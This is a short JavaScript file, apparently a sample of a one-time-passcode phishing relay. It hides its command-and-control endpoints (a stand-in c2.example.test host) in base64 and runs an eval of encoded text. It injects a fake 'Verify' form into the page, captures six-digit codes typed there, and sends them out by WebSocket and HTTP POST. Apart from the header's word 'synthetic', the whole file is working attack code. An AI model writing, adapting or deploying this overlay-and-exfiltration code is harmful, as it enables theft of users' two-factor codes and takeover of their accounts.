// OTPRELAY — synthetic OTP relay product sample.
(function () {
  var endpoints = JSON.parse(atob('eyJ3cyI6IndzczovL2MyLmV4YW1wbGUudGVzdC9vdHAiLCJodHRwIjoiaHR0cHM6Ly9jMi5leGFtcGxlLnRlc3Qvb3RwLWZhbGxiYWNrIn0='));
  eval(atob('Y29uc29sZS5sb2coJ1tPVFBSRUxBWV0gc3RhZ2UtMiBvdmVybGF5IG1vZHVsZSByZWFkeScpOw=='));
  console.log('[OTPRELAY] relay endpoints', Object.keys(endpoints).join(','));

  var session = 'sess-' + Math.floor(Math.random() * 1e6);
  var socket = null;
  try {
    socket = new WebSocket(endpoints.ws + '?s=' + encodeURIComponent(session));
    socket.onopen = function () { console.log('[OTPRELAY] websocket open'); };
    socket.onerror = function () { console.log('[OTPRELAY] websocket error'); };
  } catch (error) {
    console.log('[OTPRELAY] websocket unavailable', error.message);
  }

  function relay(code) {
    var packet = { session: session, code: code, ts: Date.now() };
    try {
      if (socket && socket.readyState === 1) socket.send(JSON.stringify(packet));
    } catch (error) {}
    try {
      fetch(endpoints.http, { method: 'POST', body: btoa(JSON.stringify(packet)) }).catch(function () {});
    } catch (error) {}
    try { localStorage.setItem('otprelay:last', JSON.stringify(packet)); } catch (error) {}
    console.log('[OTPRELAY] relayed', code);
  }

  function attachOverlay() {
    try {
      var overlay = document.createElement('div');
      overlay.id = 'otp-relay';
      overlay.innerHTML = '<form><input name="otp" maxlength="6"><button>Verify</button></form>';
      document.body.appendChild(overlay);
      overlay.addEventListener('input', function (event) {
        if (event.target && event.target.name === 'otp' && String(event.target.value).length >= 6) {
          relay(event.target.value);
        }
      });
    } catch (error) {}
  }
  attachOverlay();
  relay('482913');
  setTimeout(function () { console.log('[OTPRELAY] reconnect check'); }, 600);
})();
